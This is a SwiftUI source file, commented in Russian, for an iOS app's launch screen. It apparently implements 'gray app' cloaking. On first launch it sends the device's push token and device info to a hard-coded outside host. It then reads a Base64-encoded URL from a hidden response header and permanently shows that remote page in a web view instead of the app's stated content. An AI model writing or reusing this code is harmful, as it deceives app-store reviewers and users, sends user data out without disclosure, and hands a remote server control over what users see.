import SwiftUI

struct GrayPageView: View {

    // Конфиг:
    private let baseURL = URL(string: "http://brainstormdice.online/")! // endpoint без query
    private let headerKey = "com.dolina.brainstorm"                               // имя заголовка с конечной ссылкой

    @State private var route: Route = .splash
    @State private var showNoInternetAlert = false

    var body: some View {
        Group {
            switch route {
            case .splash:
                SplashScreenView()
                    .task { await boot() }

            case .web(let url):
                WebContainerView(url: url)
                    .transition(.opacity)

            case .app:
                ContentView()
                    .transition(.opacity)
            }
        }
        .animation(.easeInOut(duration: 0.25), value: route)
        .alert("No Internet Connection",
               isPresented: $showNoInternetAlert,
               actions: {
                   Button("Retry") {
                       Task { await retryAfterAlert() }
                   }
                   Button("Cancel", role: .cancel) { }
               },
               message: {
                   Text("Check your Internet connection and try again.")
               })
    }

    enum Route: Equatable {
        case splash
        case web(URL)
        case app
    }

    // MARK: - Boot sequence

    @MainActor
    private func boot() async {
        // 1) Читаем сохранённый режим
        switch Persistence.shared.loadState() {
        case .forceMain:
            // Этот выбор окончательный — сразу в основное приложение
            route = .app

        case .web(let savedURL):
            // Есть сохранённая ссылка — при наличии интернета сразу открываем web
            let online = await InternetChecker.hasInternet()
            if online {
                route = .web(savedURL)
            } else {
                // Показать алерт и дать возможность «Retry»
                showNoInternetAlert = true
                // остаёмся на сплэше
            }

        case .undecided:
            // Первый «осмысленный» запуск — решаем судьбу
            await firstDecisionFlow()
        }
    }

    @MainActor
    private func retryAfterAlert() async {
        // Повторная проверка только для сценария saved web
        switch Persistence.shared.loadState() {
        case .web(let savedURL):
            let online = await InternetChecker.hasInternet()
            if online {
                route = .web(savedURL)
            } else {
                showNoInternetAlert = true // снова показать
            }
        default:
            // На всякий случай — пересоберём логику boot()
            await boot()
        }
    }

    // MARK: - First decision (only once when undecided)

    @MainActor
    private func firstDecisionFlow() async {
        // 0) Сначала проверим интернет
        let online = await InternetChecker.hasInternet()
        if !online {
            // Интернета нет на самом первом запуске → навсегда в основное приложение
            Persistence.shared.saveForceMain()
            route = .app
            return
        }

        // 1) Есть интернет. Пробуем получить токен (покажет системный алерт при необходимости)
        do {
            let token = try await NotificationManager.shared.requestToken()
            //print("✅ token =", token)

            // 2) Собираем параметры устройства
            let device = DeviceInfoManager.shared.getInfo()

            // 3) Делаем запрос на baseURL с query, читаем заголовок headerKey
            if let targetURL = await LinkFetcher.fetchLink(
                baseURL: baseURL,
                headerKey: headerKey,
                device: device,
                token: token
            ) {
                // 👉 перед сохранением пробуем декодировать как Base64
                let decodedString = Base64Helper.decode(targetURL.absoluteString) ?? targetURL.absoluteString
                if let finalURL = URL(string: decodedString) {
                    Persistence.shared.saveWebURL(finalURL)
                    route = .web(finalURL)
                } else {
                    // если не получилось декодировать — откат в основное приложение
                    Persistence.shared.saveForceMain()
                    route = .app
                }
            } else {
                // Ключ не найден — фиксируем навсегда основное приложение
                Persistence.shared.saveForceMain()
                route = .app
            }
        } catch {
            // Не получили токен / отказал пермишен / иная ошибка → фиксируем основной режим
            //print("⚠️ token error:", error.localizedDescription)
            Persistence.shared.saveForceMain()
            route = .app
        }
    }
}
